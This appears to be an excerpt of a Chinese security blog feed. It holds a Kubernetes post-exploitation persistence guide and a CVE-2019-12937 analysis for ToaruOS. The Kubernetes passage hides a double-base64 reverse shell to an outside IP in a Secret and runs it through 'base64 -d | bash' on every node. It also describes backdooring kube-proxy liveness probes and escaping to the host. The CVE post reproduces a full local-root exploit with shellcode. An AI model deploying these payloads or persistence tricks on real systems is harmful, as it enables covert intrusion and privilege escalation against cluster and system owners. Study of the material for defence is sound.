class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">mysecret</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">Opaque</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">USER_NAME:</span> <span class="string">TUR3bU1UWTVMVHRsZUdWaklERTJPVHcrTDJSbGRpOTBZM0F2TVRreUxqRTJPQzQxTmk0eEx6azVPRGc3YzJnZ1BDWXhOamtnUGlZeE5qa2dNajRtTVRZNQ==</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-deployment</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.22</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">USER</span></span><br><span class="line">          <span class="attr">valueFrom:</span></span><br><span class="line">            <span class="attr">secretKeyRef:</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">mysecret</span></span><br><span class="line">              <span class="attr">key:</span> <span class="string">USER_NAME</span></span><br><span class="line">              <span class="attr">optional:</span> <span class="literal">false</span></span><br><span class="line">        <span class="attr">args:</span> </span><br><span class="line">        <span class="bullet">-</span> <span class="string">/bin/bash</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">echo</span> <span class="string">$USER</span> <span class="string">|</span> <span class="string">base64</span> <span class="string">-d</span> <span class="string">|</span> <span class="string">bash</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">tolerations:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">node-role.kubernetes.io/control-plane</span></span><br><span class="line">        <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">        <span class="attr">effect:</span> <span class="string">NoSchedule</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">node-role.kubernetes.io/master</span></span><br><span class="line">        <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">        <span class="attr">effect:</span> <span class="string">NoSchedule</span></span><br><span class="line">      <span class="attr">nodeSelector:</span></span><br><span class="line">        <span class="attr">kubernetes.io/arch:</span> <span class="string">amd64</span></span><br></pre></td></tr></table></figure><p>成功创建在每个node上反弹获得shell<br><img src="https://s2.loli.net/2023/01/03/xBOSAnXZlEPKzVD.png" alt="image.png"><br><img src="https://s2.loli.net/2023/01/03/yf3cpkuXNTAx1go.png" alt="image.png"></p><h1 id="利用现有资源"><a href="#利用现有资源" class="headerlink" title="利用现有资源"></a>利用现有资源</h1><p>在进入集群后，查看当前集群已经创建的资源，可以找到一些直接利用的资源，就不用在自己创建，但是这样也会有一定的隐患，修改现有资源会导致Pod重启，可能会影响到正常的业务运行，这个就需要自己来取舍了。</p><h2 id="修改哪些？"><a href="#修改哪些？" class="headerlink" title="修改哪些？"></a>修改哪些？</h2><p>根据前文的探索与了解，可以根据不同的ns以及不同的资源来利用。</p><ul><li>Deployment</li><li>StatefulSet</li><li>DaemonSet</li><li>CronJob</li></ul><h3 id="Lease"><a href="#Lease" class="headerlink" title="Lease"></a>Lease</h3><p>前文中发现了有一个特殊的ns是<code>kube-node-lease</code>，该ns下主要是<code>Lease</code>对象，主要，每一个节点都有一个与之对应的<code>Lease</code>对象，并且该对象隐蔽性很好。<br>根据阅读<a href="https://kubernetes.io/zh-cn/docs/reference/kubernetes-api/cluster-resources/lease-v1/#LeaseSpec">相关文档</a>研究，由于LeaseSpec（LeaseSpec 是一个 Lease 的规范）不支持，没有执行命令的相关spec，不能执行命令的话导致无法反弹shell，所以无法利用。</p><h3 id="容器探针"><a href="#容器探针" class="headerlink" title="容器探针"></a>容器探针</h3><p>根据对<code>Lease</code>研究知道，首先这个东西起码要可以执行命令，通过继续对Kubernetes的不断探索，发现了一个叫做容器探针的东西。<br>容器探针(probe)是<code>kubelet</code>用来对容器定期执行诊断的。</p><p>检测容器有四种方法：</p><ul><li><code>exec</code>：在容器内执行指定命令命令退出返回为0，成功退出，结合相关配置可以达到类似CronJob的效果；为了安全以及隐藏，不能真正完成探测不论启动、就绪、存活探测结果不能是失败，要不就重启或者删ip；</li><li><code>HTTP</code>：发送一个httpGet请求，如果响应大于等于 200 且小于 400，则诊断被认为是成功的，只能用于本身是web服务的；由于不能同时使用多个检查方式，该方式利用不现实。</li><li><code>gRPC</code>：使用<code>gRPC</code>执行一个远程调用，同上利用不现实。</li><li><code>tcp</code>：对容器的 IP 地址上的指定端口执行 TCP 检查，虽然是<code>kubelet</code>直接在节点上发起探测，但是同上利用不现实。</li></ul><p>探测类型主要有三种：</p><ul><li><strong>存活（Liveness）</strong>：存活探针是<code>kubelet</code>用来确定什么时候要重启容器。</li><li><strong>就绪（Readiness）</strong>：就绪探针是<code>kubelet</code>可以知道容器何时准备好接受请求流量，当一个 Pod 内的所有容器都就绪时，才能认为该 Pod 就绪。</li><li><strong>启动（Startup）</strong>：启动探针是<code>kubelet</code>用来了解应用容器何时启动。如果提供了启动探针，则所有其他探针都会被禁用，直到此探针成功为止。</li></ul><p>通过对容器探针的进一步了解，可以通过修改当前集群现有资源，对具有每一个节点都有相关Pod运行的资源进行修改，结合探测类型某种程度上相当于将<code>CronJon</code>的特点融合了进来，添加检测方法为<code>exec</code>类型为存活探针进行利用，具体利用时可以再根据<a href="https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.25/#probe-v1-core">Probe</a>配置文档，设置<code>initialDelaySeconds</code>、<code>periodSeconds</code>等字段来控制反弹回的shell时间，以及Pod失败等重启。</p><h2 id="如何修改现有资源对象？"><a href="#如何修改现有资源对象？" class="headerlink" title="如何修改现有资源对象？"></a>如何修改现有资源对象？</h2><p>以下命令主要为借助<code>kubectl</code>对现有资源进行修改</p><ul><li><code>apply</code>：支持同时多个资源对象，资源不存在时将创建资源，该命令更新后会重启资源</li><li><code>edit</code>：可以直接编辑已经存在的资源，本质就是先get 后apply，可以编辑多个但是一次只能应用一个</li><li><code>patch</code>：通过命令行的方式添加部分内容，接受JSON或YAML格式</li><li><code>replace</code>：替换资源，先删除后创建，必须提供完整的spec</li><li><code>set</code>：配置资源，只能修改部分比如env、image、resources、selector、serviceaccount、subject</li></ul><h2 id="利用kube-proxy"><a href="#利用kube-proxy" class="headerlink" title="利用kube-proxy"></a>利用kube-proxy</h2><p>通过前文探索，对于较为的隐蔽的ns可以利用<code>kube-system</code>，在该ns下<code>kube-proxy</code>又是特别好拿来利用的，他本身就是<code>DaemonSet</code>在每一个节点上都有一Pod，并且是每一个集群最基本默认就存在的，并且经过测试，该Pod使用的环境中虽然条件苛刻，但是自带<code>perl</code>可以用来反弹，并且该Pod默认开启了多项<code>Linux Capabilities</code>可以直接逃逸到宿主机。<br><img src="https://s2.loli.net/2023/01/03/1pRfbkEgtSY6AVq.png" alt="image.png"><br>可以看到是具有比如<code>CAP_SYS_MODULE</code>、<code>CAP_DAC_READ_SEARCH</code>、<code>CAP_SYS_ADMIN</code><br><img src="https://s2.loli.net/2023/01/03/PU51wMBsZrv678l.png" alt="image.png"><br>修改资源<code>kubectl -n kube-system edit ds kube-proxy</code><br>添加容器探针的利用<br><img src="https://s2.loli.net/2023/01/03/dDNRfiO9Uce8SoQ.png" alt="image.png"><br>修改成功<br><img src="https://s2.loli.net/2023/01/03/R9qjur4a8L6XbS2.png" alt="image.png"><br>并成功反弹shell<br><img src="https://s2.loli.net/2023/01/03/ECvwbRKtA9oydIz.png" alt="image.png"><br>如果<code>kube-proxy</code>启动的时候<code>--hostname-override</code>默认为空，那么容器内的<code>hostname</code>就是节点的名字，最后只需要利用<code>CAP_SYS_ADMIN</code>根据<code>hostname</code>逃逸到需要的节点。<br><img src="https://s2.loli.net/2023/01/03/ZYIEu7xP9gsoKfO.png" alt="image.png"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://kubernetes.io/docs/concepts/architecture/">https://kubernetes.io/docs/concepts/architecture/</a></li><li><a href="https://kubernetes.io/docs/concepts/workloads/">https://kubernetes.io/docs/concepts/workloads/</a></li><li><a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/#heartbeats">https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/#heartbeats</a></li><li><a href="https://kubernetes.io/zh-cn/docs/reference/kubernetes-api/workload-resources/pod-v1/#Probe">https://kubernetes.io/zh-cn/docs/reference/kubernetes-api/workload-resources/pod-v1/#Probe</a></li><li><a href="https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#-strong-app-management-strong-">https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#-strong-app-management-strong-</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 云原生 </category>
          
          <category> Kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
            <tag> 持久化 </tag>
            
            <tag> k8s </tag>
            
            <tag> Kubernetes </tag>
            
            <tag> 云原生 </tag>
            
            <tag> 横向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-12937 ToaruOS权限提升分析</title>
      <link href="/posts/97367518/"/>
      <url>/posts/97367518/</url>
      
        <content type="html"><![CDATA[<p>ToaruOS是一套使用C语言编写的开源计算机操作系统，是一个由伊利诺伊大学计算机科学本科生开发的业余爱好操作系统。ToAruOS可在POSIX和x86架构上运行。ToAruOS的主要功能包括对进程和线程的支持、ELF二进制的支持、运行时加载模块、管道（Pipe）和各种类型的终端设备（TTY）的支持、虚拟文件系统的支持、EXT2文件系统的支持、信号量支持等。</p><p>从 1.10.9 到 ToaruOS 的 gsudo 中的 apps&#x2F;gsudo.c 有一个缓冲区溢出，允许通过 DISPLAY 环境变量将本地权限提升到 root 用户。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先去查看关于这次漏洞的针对的更新，patch：<a href="https://github.com/klange/toaruos/commit/7fdaca463fe6ce86939ea77ac08faa886f624444?diff=split">https://github.com/klange/toaruos/commit/7fdaca463fe6ce86939ea77ac08faa886f624444?diff=split</a><br><img src="https://s2.loli.net/2022/03/10/ba8rwvM2kK1p6WO.png" alt="image.png"><br>通过对比查看看出这个洞原理很简单，作者这次修复的commit只是在原来的基础上增加了两行代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">FILE * <span class="title function_">pex_connect</span><span class="params">(<span class="type">char</span> * target)</span> &#123;</span><br><span class="line"><span class="type">char</span> tmp[<span class="number">100</span>];</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(target) &gt; <span class="number">80</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">sprintf</span>(tmp, <span class="string">&quot;/dev/pex/%s&quot;</span>, target);</span><br><span class="line">FILE * out = fopen(tmp, <span class="string">&quot;r+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (out) &#123;</span><br><span class="line">@@ <span class="number">-58</span>,<span class="number">6</span> +<span class="number">59</span>,<span class="number">7</span> @@ FILE * <span class="title function_">pex_connect</span><span class="params">(<span class="type">char</span> * target)</span> &#123;</span><br><span class="line"></span><br><span class="line">FILE * <span class="title function_">pex_bind</span><span class="params">(<span class="type">char</span> * target)</span> &#123;</span><br><span class="line"><span class="type">char</span> tmp[<span class="number">100</span>];</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(target) &gt; <span class="number">80</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">sprintf</span>(tmp, <span class="string">&quot;/dev/pex/%s&quot;</span>, target);</span><br><span class="line">FILE * out = fopen(tmp, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (out) &#123;</span><br></pre></td></tr></table></figure><p>在<code>sprintf</code>前面加了一行判断<code>if (strlen(target) &gt; 80) return NULL;</code>，<code>target</code>的这个字符串长度如果超过80那么就直接返回。</p><p><code>sprintf</code>是一个拼接函数将<code>target</code>和前面的字符串拼接放到了前面的<code>tmp</code>这个局部变量为100个字节大小中，通过判断很可能是<code>sprintf</code>这个函数拼接完的长度超过了<code>tmp</code> 的长度造成了栈溢出的漏洞。</p><p>查看一下<code>pex_connect</code>这个函数是从那里调用的<br><img src="https://s2.loli.net/2022/03/10/RuhzjxM9ivn5sAF.png" alt="image.png"><br>是通过<code>yutani.c</code>这个文件中的<code>yutani_init</code>这个函数调用的，调用时传入了<code>server_name</code>这个参数，这个参数是通过前面获得环境变量中的<code>DISPLAY</code>参数获得，并且此参数的获取是可控的导致漏洞的触发。</p><h1 id="如何提权？"><a href="#如何提权？" class="headerlink" title="如何提权？"></a>如何提权？</h1><p><code>yutani.c</code>是作为一个基础的依赖文件，而权限的提升正是由于<code>gusdo</code>这个应用导致，可以发现这个程序调用了<code>yutani.c</code>导致栈溢出，那为什么这个程序可以提权呢？<br><img src="https://s2.loli.net/2022/03/10/AN1h6uHOI9ktoPM.png" alt="image.png"></p><h2 id="SUID-权限"><a href="#SUID-权限" class="headerlink" title="SUID 权限"></a>SUID 权限</h2><p>在Linux中有除了rwx权限外还有s权限，当程序中的x权限变为s时表示，这个程序拥有这个程序所有者的权限。</p><p>比如普通用户可以通过passwd修改自己的密码，但是实际修改时&#x2F;etc&#x2F;passwd这个文件的内容，但是这个文件只用root才有权限更改，但是我们通过passwd这个拥有suid权限的程序，临时的使用root权限达到修改密码的目的。<br><img src="https://s2.loli.net/2022/03/10/xDarypeG9Ov1Hi7.png" alt="image.png"></p><ul><li>SUID 权限仅对二进制可执行文件有效</li><li>如果执行者对于该二进制可执行文件具有 x 的权限，执行者将具有该文件的所有者的权限</li><li>本权限仅在执行该二进制可执行文件的过程中有效</li></ul><p>而gsudo正是拥有suid权限的程序，类似与一些Linux中的sudo、su等用途，临时使用root权限。</p><h1 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h1><p>这里的poc使用的是cve详情中给出的链接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  The Mickey Mouse Hacking Squadron proudly presents</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *                   CVE-2019-12937</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *       ToaruOS 1.10.9 gsudo local root exploit</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *                   .-&quot;&quot;&quot;-.</span></span><br><span class="line"><span class="comment"> *                  /  . -  \</span></span><br><span class="line"><span class="comment"> *                  \       /</span></span><br><span class="line"><span class="comment"> *            .-&quot;&quot;-.,:.-_-.&lt;</span></span><br><span class="line"><span class="comment"> *           /    _; , / ).|</span></span><br><span class="line"><span class="comment"> *           \  ; / `  `&quot;  &#x27;\</span></span><br><span class="line"><span class="comment"> *            &#x27;.-| ;-.____, |             .,</span></span><br><span class="line"><span class="comment"> *                \ `._~_/ /             /&quot;/</span></span><br><span class="line"><span class="comment"> *   ,.           /`-.__.-&#x27;\`-._     ,&quot;,&#x27; ;</span></span><br><span class="line"><span class="comment"> *   \&quot;\         / /|   o   \._ `-._; /  ./-.</span></span><br><span class="line"><span class="comment"> *    ; &#x27;;,     / / |    `__ \ `-.,( /  //.-&#x27;</span></span><br><span class="line"><span class="comment"> *   :\  \\;_.-&quot; ;  |.-&quot;`    ``\    /-. /.-&#x27;</span></span><br><span class="line"><span class="comment"> *    :\  .\),.-&#x27;  /      &#125;&#123;    |   &#x27;..&#x27;</span></span><br><span class="line"><span class="comment"> *      \ .-\      |          , /</span></span><br><span class="line"><span class="comment"> *       &#x27;..&#x27;      ;&#x27;        , /</span></span><br><span class="line"><span class="comment"> *                ( __ `;--;&#x27;__`)</span></span><br><span class="line"><span class="comment"> *                 `//&#x27;`    `||`</span></span><br><span class="line"><span class="comment"> *                _//        ||</span></span><br><span class="line"><span class="comment"> *        .-&quot;-._,(__)      .(__).-&quot;&quot;-.</span></span><br><span class="line"><span class="comment"> *       /          \     /           \</span></span><br><span class="line"><span class="comment"> *       \          /     \           /</span></span><br><span class="line"><span class="comment"> *        `&#x27;--==&quot;--`       `--&quot;&quot;==--&#x27;`</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  local@livecd ~$ gcc kowasu-gsudo.c -o kowasu-gsudo</span></span><br><span class="line"><span class="comment"> *  local@livecd ~$ whoami</span></span><br><span class="line"><span class="comment"> *  local</span></span><br><span class="line"><span class="comment"> *  local@livecd ~$ ./kowasu-gsudo</span></span><br><span class="line"><span class="comment"> *  0@livecd /home/local# whoami</span></span><br><span class="line"><span class="comment"> *  root</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EIP          <span class="string">&quot;\xb0\xb0\x01\x3f&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EIP_DISTANCE 26U</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x04</span>, <span class="number">0x18</span>, <span class="number">0x31</span>, <span class="number">0xdb</span>, <span class="number">0xcd</span>, <span class="number">0x7f</span>, <span class="number">0xeb</span>, <span class="number">0x1a</span>, <span class="number">0x5b</span>, <span class="number">0x31</span>,</span><br><span class="line">  <span class="number">0xc0</span>, <span class="number">0x88</span>, <span class="number">0x43</span>, <span class="number">0x07</span>, <span class="number">0x89</span>, <span class="number">0x5b</span>, <span class="number">0x08</span>, <span class="number">0x89</span>, <span class="number">0x43</span>, <span class="number">0x0c</span>, <span class="number">0x04</span>, <span class="number">0x07</span>,</span><br><span class="line">  <span class="number">0x8d</span>, <span class="number">0x4b</span>, <span class="number">0x08</span>, <span class="number">0x8d</span>, <span class="number">0x53</span>, <span class="number">0x0c</span>, <span class="number">0xcd</span>, <span class="number">0x7f</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xcd</span>, <span class="number">0x7f</span>,</span><br><span class="line">  <span class="number">0xe8</span>, <span class="number">0xe1</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>,</span><br><span class="line">  <span class="number">0x68</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> shellcode_length = <span class="number">57</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Payload is large, because the arguments and environment start around</span></span><br><span class="line"><span class="comment"> * 0x3f00XXXX and we need to pivot the address to remove the 0 byte.</span></span><br><span class="line"><span class="comment"> * We do this by including a 64k nop sled in the payload.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> payload[<span class="number">65536</span>];</span><br><span class="line"><span class="type">char</span> <span class="built_in">vector</span>[<span class="number">8192</span>]   = <span class="string">&quot;DISPLAY=AAA&quot;</span>;</span><br><span class="line"><span class="type">char</span> * <span class="type">const</span> arg[<span class="number">3</span>] = &#123; <span class="string">&quot;/bin/gsudo&quot;</span>, <span class="string">&quot;meh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="type">char</span> * <span class="type">const</span> env[<span class="number">3</span>] = &#123; payload, <span class="built_in">vector</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(payload, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(payload) - shellcode_length - <span class="number">1</span>);</span><br><span class="line">payload[<span class="keyword">sizeof</span>(payload) - shellcode_length - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">strcat</span>(payload, shellcode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; EIP_DISTANCE; i++)</span><br><span class="line"><span class="built_in">strcat</span>(<span class="built_in">vector</span>, EIP);</span><br><span class="line"></span><br><span class="line">execve(<span class="string">&quot;/bin/gsudo&quot;</span>, arg, env);</span><br><span class="line"></span><br><span class="line">perror(<span class="string">&quot;execve()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tmp的长度为100，溢出的长度为100+ebp(4)+ret(4)，对应到payload中为eip乘以4为104加上AAA以及一个空字符刚好为108</p><p>跳转的地址为定义的”\xb0\xb0\x01\x3f”，shellcode把它放到了env这个变量中，而这个地址是介于arg与env之前的一个地址，从中随机挑选了这个地址，但是在arg地址中不能出现\x00，所以这之间大量填充了A的Nop的指令。</p><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p><a href="https://github.com/mehsauce/kowasuos/blob/master/shellcode/execve.asm">https://github.com/mehsauce/kowasuos/blob/master/shellcode/execve.asm</a></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">BITS <span class="number">32</span></span><br><span class="line"></span><br><span class="line">%define NR_execve <span class="number">7</span></span><br><span class="line">%define NR_setuid <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    xor eax, eax</span><br><span class="line">    add al, NR_setuid</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    int <span class="number">0x7f</span></span><br><span class="line">    jmp short end</span><br><span class="line">start:</span><br><span class="line">    pop ebx</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov [ebx+<span class="number">7</span>], al</span><br><span class="line">    mov [ebx+<span class="number">8</span>], ebx</span><br><span class="line">    mov [ebx+<span class="number">12</span>], eax</span><br><span class="line">    add al, NR_execve</span><br><span class="line">    lea ecx, [ebx+<span class="number">8</span>]</span><br><span class="line">    lea edx, [ebx+<span class="number">12</span>]</span><br><span class="line">    int <span class="number">0x7f</span></span><br><span class="line">    xor eax, eax</span><br><span class="line">    int <span class="number">0x7f</span></span><br><span class="line">end:</span><br><span class="line">    call start</span><br><span class="line">db <span class="string">&quot;/bin/shh&quot;</span></span><br><span class="line">db <span class="string">&quot;XXXXXXXX&quot;</span></span><br></pre></td></tr></table></figure><p>这个shellcode主要是先通过setuid(0)设置当前进程的一个权限的函数，通过执行system(&#x2F;bin&#x2F;sh)返回shell，ToaruOS通过int 0x7f调用系统函数，在syscall_nums.h中有系统的调用号，setuid对应的为24，system对应7，将汇编转换为一个字节码放到poc中执行达到最终的提权。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12937">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12937</a><br><a href="https://xz.aliyun.com/t/5914">https://xz.aliyun.com/t/5914</a><br><a href="https://github.com/mehsauce/kowasuos/blob/master/exploits/kowasu-gsudo.c">https://github.com/mehsauce/kowasuos/blob/master/exploits/kowasu-gsudo.c</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域认证协议</title>
      <link href="/posts/e5b8863d/"/>
      <url>/posts/e5b8863d/</url>
      
